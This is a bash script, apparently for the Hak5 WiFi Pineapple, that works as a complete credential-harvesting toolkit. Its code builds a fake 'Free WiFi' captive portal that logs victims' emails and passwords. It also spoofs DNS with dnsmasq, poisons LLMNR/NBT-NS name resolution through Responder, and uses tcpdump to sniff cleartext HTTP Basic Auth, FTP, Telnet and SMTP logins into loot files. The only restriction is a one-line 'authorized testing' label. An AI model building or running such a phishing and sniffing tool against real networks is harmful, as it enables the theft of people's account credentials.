#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec Credential Harvester
# Multi-protocol credential capture and phishing toolkit
#
# For authorized security testing only!
# Credits: Built for Hak5 WiFi Pineapple - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0"
LOOT_DIR="/mmc/nullsec/creds"
PORTAL_DIR="/mmc/nullsec/portals"
DATE_TAG=$(date +%Y%m%d_%H%M%S)

mkdir -p "$LOOT_DIR" "$PORTAL_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${RED}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║           NULLSEC CREDENTIAL HARVESTER v1.0                   ║
    ║                                                               ║
    ║        Multi-Protocol Credential Capture Toolkit              ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "    ${CYAN}Built for Hak5 WiFi Pineapple - https://hak5.org${NC}"
    echo ""
}

log() {
    local level=$1
    shift
    local timestamp=$(date '+%H:%M:%S')
    case $level in
        INFO)  echo -e "${GREEN}[$timestamp]${NC} $@" ;;
        WARN)  echo -e "${YELLOW}[$timestamp]${NC} $@" ;;
        CRED)  echo -e "${RED}[$timestamp CRED]${NC} $@" ;;
    esac
}

# Callback for captured credentials
cred_callback() {
    local type=$1
    local data=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    log CRED "Captured $type credential!"
    echo "$timestamp | $type | $data" >> "$LOOT_DIR/all_creds_${DATE_TAG}.txt"
    
    # Play alert sound if available
    [ -f /usr/bin/speaker-test ] && timeout 1 speaker-test -t sine -f 1000 -l 1 2>/dev/null &
}

# HTTP credential capture (fake AP captive portal)
start_captive_portal() {
    local ssid=${1:-"Free_WiFi"}
    local template=${2:-"generic"}
    
    log INFO "Starting captive portal with SSID: $ssid"
    
    # Create portal directory
    local portal_path="$PORTAL_DIR/$template"
    mkdir -p "$portal_path"
    
    # Create generic login page
    cat > "$portal_path/index.html" << 'HTMLPAGE'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; padding: 20px; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); max-width: 400px; width: 100%; }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; }
        input:focus { border-color: #667eea; outline: none; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 20px; }
        button:hover { opacity: 0.9; }
        .terms { font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🌐 Free WiFi Access</h1>
        <p>Sign in to connect to the internet</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
        <p class="terms">By connecting, you agree to the terms of service.</p>
    </div>
</body>
</html>
HTMLPAGE

    # Create capture handler script
    cat > "$portal_path/capture.sh" << 'CAPTURESCRIPT'
#!/bin/bash
# Read POST data from stdin
read POST_DATA

# Parse credentials
EMAIL=$(echo "$POST_DATA" | grep -oP 'email=\K[^&]*' | sed 's/%40/@/g' | sed 's/+/ /g')
PASSWORD=$(echo "$POST_DATA" | grep -oP 'password=\K[^&]*' | sed 's/+/ /g')

# Log credentials
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
LOOT_FILE="/mmc/nullsec/creds/portal_creds.txt"

echo "[$TIMESTAMP] Email: $EMAIL | Password: $PASSWORD" >> "$LOOT_FILE"

# Return redirect
echo "HTTP/1.1 302 Found"
echo "Location: http://connectivitycheck.gstatic.com/generate_204"
echo ""
CAPTURESCRIPT

    chmod +x "$portal_path/capture.sh"
    
    # Start simple HTTP server
    log INFO "Starting HTTP server on port 80..."
    
    # Use busybox httpd if available, or Python
    if command -v python3 &>/dev/null; then
        cd "$portal_path"
        python3 -m http.server 80 &
        echo $! > /tmp/portal_pid
    elif command -v php &>/dev/null; then
        php -S 0.0.0.0:80 -t "$portal_path" &
        echo $! > /tmp/portal_pid
    else
        log WARN "No suitable HTTP server found"
        return 1
    fi
    
    log INFO "Captive portal running!"
    log INFO "Captured credentials will be saved to: $LOOT_DIR/portal_creds.txt"
}

# Stop captive portal
stop_captive_portal() {
    log INFO "Stopping captive portal..."
    
    if [ -f /tmp/portal_pid ]; then
        kill $(cat /tmp/portal_pid) 2>/dev/null
        rm /tmp/portal_pid
    fi
    
    pkill -f "http.server 80" 2>/dev/null
    pkill -f "php.*80" 2>/dev/null
}

# DNS spoofing for credential capture
start_dns_spoof() {
    local target_domain=${1:-"*"}
    local redirect_ip=${2:-$(ip route | grep default | awk '{print $9}')}
    
    log INFO "Starting DNS spoof for: $target_domain -> $redirect_ip"
    
    # Create dnsmasq config
    cat > /tmp/dnsspoof.conf << EOF
no-resolv
address=/$target_domain/$redirect_ip
log-queries
log-facility=/mmc/nullsec/creds/dns_queries.log
EOF

    # Start dnsmasq
    dnsmasq -C /tmp/dnsspoof.conf &
    echo $! > /tmp/dnsspoof_pid
    
    log INFO "DNS spoofing active"
}

# Responder-style LLMNR/NBT-NS poisoning
start_name_poisoning() {
    log INFO "Starting name resolution poisoning..."
    
    local interface=$(ip route | grep default | awk '{print $5}' | head -1)
    local output_file="$LOOT_DIR/poisoning_${DATE_TAG}.txt"
    
    # Check for Responder
    if command -v responder &>/dev/null; then
        responder -I "$interface" -wrf 2>&1 | tee "$output_file" &
        echo $! > /tmp/responder_pid
        log INFO "Responder running on $interface"
    else
        log WARN "Responder not installed, using basic capture..."
        
        # Basic LLMNR/NBT-NS listener using tcpdump
        tcpdump -i "$interface" -nn 'udp port 5355 or udp port 137' 2>/dev/null | while read line; do
            echo "$(date '+%Y-%m-%d %H:%M:%S') | $line" >> "$output_file"
            log INFO "Name query captured: $line"
        done &
        echo $! > /tmp/namecap_pid
    fi
}

# HTTP Basic Auth capture
capture_http_auth() {
    local interface=${1:-$(ip route | grep default | awk '{print $5}' | head -1)}
    local output_file="$LOOT_DIR/http_auth_${DATE_TAG}.txt"
    
    log INFO "Capturing HTTP Basic Auth on $interface..."
    
    # Capture HTTP traffic with auth headers
    tcpdump -i "$interface" -A -s0 'tcp port 80' 2>/dev/null | \
        grep -E "Authorization: Basic|user=|pass=|login=|email=" | \
        while read line; do
            echo "$(date '+%Y-%m-%d %H:%M:%S') | $line" >> "$output_file"
            
            # Try to decode Base64 auth
            if echo "$line" | grep -q "Authorization: Basic"; then
                local encoded=$(echo "$line" | grep -oP 'Basic \K[^ ]+')
                local decoded=$(echo "$encoded" | base64 -d 2>/dev/null)
                cred_callback "HTTP-BASIC" "$decoded"
            fi
        done &
    echo $! > /tmp/httpcap_pid
    
    log INFO "HTTP capture running"
}

# FTP credential capture
capture_ftp() {
    local interface=${1:-$(ip route | grep default | awk '{print $5}' | head -1)}
    local output_file="$LOOT_DIR/ftp_${DATE_TAG}.txt"
    
    log INFO "Capturing FTP credentials on $interface..."
    
    tcpdump -i "$interface" -nn -l 'port 21' 2>/dev/null | \
        grep -E "USER|PASS" | \
        while read line; do
            echo "$(date '+%Y-%m-%d %H:%M:%S') | $line" >> "$output_file"
            cred_callback "FTP" "$line"
        done &
    echo $! > /tmp/ftpcap_pid
}

# Telnet credential capture
capture_telnet() {
    local interface=${1:-$(ip route | grep default | awk '{print $5}' | head -1)}
    local output_file="$LOOT_DIR/telnet_${DATE_TAG}.txt"
    
    log INFO "Capturing Telnet traffic on $interface..."
    
    tcpdump -i "$interface" -nn -l 'port 23' -A 2>/dev/null | \
        tee -a "$output_file" | \
        grep -E "login:|password:|Password:" &
    echo $! > /tmp/telnetcap_pid
}

# SMTP credential capture
capture_smtp() {
    local interface=${1:-$(ip route | grep default | awk '{print $5}' | head -1)}
    local output_file="$LOOT_DIR/smtp_${DATE_TAG}.txt"
    
    log INFO "Capturing SMTP credentials on $interface..."
    
    tcpdump -i "$interface" -nn -l 'port 25 or port 587' -A 2>/dev/null | \
        grep -E "AUTH|PLAIN|LOGIN" | \
        while read line; do
            echo "$(date '+%Y-%m-%d %H:%M:%S') | $line" >> "$output_file"
            cred_callback "SMTP" "$line"
        done &
    echo $! > /tmp/smtpcap_pid
}

# Full credential capture suite
full_capture() {
    banner
    log INFO "Starting full credential capture suite..."
    
    local interface=$(ip route | grep default | awk '{print $5}' | head -1)
    
    echo ""
    echo -e "${CYAN}═══ Starting Capture Services ═══${NC}"
    
    capture_http_auth "$interface"
    capture_ftp "$interface"
    capture_telnet "$interface"
    capture_smtp "$interface"
    
    log INFO ""
    log INFO "All capture services running!"
    log INFO "Credentials will be saved to: $LOOT_DIR"
    log INFO ""
    log INFO "Press Ctrl+C to stop all captures..."
    
    # Wait for interrupt
    trap cleanup SIGINT
    while true; do
        sleep 1
    done
}

# Cleanup function
cleanup() {
    echo ""
    log INFO "Stopping all capture services..."
    
    for pid_file in /tmp/*cap_pid /tmp/*_pid; do
        if [ -f "$pid_file" ]; then
            kill $(cat "$pid_file") 2>/dev/null
            rm "$pid_file"
        fi
    done
    
    pkill -f "tcpdump" 2>/dev/null
    
    log INFO "Cleanup complete"
    exit 0
}

# View captured credentials
view_creds() {
    banner
    echo -e "${CYAN}═══ Captured Credentials ═══${NC}"
    echo ""
    
    if [ -f "$LOOT_DIR/all_creds_${DATE_TAG}.txt" ]; then
        cat "$LOOT_DIR/all_creds_${DATE_TAG}.txt"
    else
        echo "No credentials captured in this session"
    fi
    
    echo ""
    echo -e "${CYAN}═══ All Credential Files ═══${NC}"
    ls -la "$LOOT_DIR"/*.txt 2>/dev/null || echo "No credential files found"
}

# Interactive menu
interactive() {
    banner
    
    echo "Select operation:"
    echo "  1) Start Captive Portal"
    echo "  2) Start DNS Spoofing"
    echo "  3) Start Name Poisoning (LLMNR/NBT-NS)"
    echo "  4) Capture HTTP Auth"
    echo "  5) Capture FTP Credentials"
    echo "  6) Full Capture Suite"
    echo "  7) View Captured Credentials"
    echo "  8) Stop All Services"
    echo ""
    read -p "Choice [1-8]: " choice
    
    case $choice in
        1)
            read -p "SSID name [Free_WiFi]: " ssid
            start_captive_portal "${ssid:-Free_WiFi}"
            ;;
        2)
            read -p "Domain to spoof [*]: " domain
            start_dns_spoof "${domain:-*}"
            ;;
        3) start_name_poisoning ;;
        4) capture_http_auth ;;
        5) capture_ftp ;;
        6) full_capture ;;
        7) view_creds ;;
        8) cleanup ;;
        *) echo "Invalid choice" ;;
    esac
}

# Main
main() {
    case "$1" in
        --portal) start_captive_portal "$2" "$3" ;;
        --dns) start_dns_spoof "$2" "$3" ;;
        --poison) start_name_poisoning ;;
        --http) capture_http_auth ;;
        --ftp) capture_ftp ;;
        --full) full_capture ;;
        --view) view_creds ;;
        --stop) cleanup ;;
        -h|--help)
            banner
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  --portal [SSID]    Start captive portal"
            echo "  --dns [domain]     Start DNS spoofing"
            echo "  --poison           Start LLMNR/NBT-NS poisoning"
            echo "  --http             Capture HTTP auth"
            echo "  --ftp              Capture FTP credentials"
            echo "  --full             Full capture suite"
            echo "  --view             View captured credentials"
            echo "  --stop             Stop all services"
            echo "  -h, --help         Show this help"
            echo ""
            ;;
        *) interactive ;;
    esac
}

main "$@"
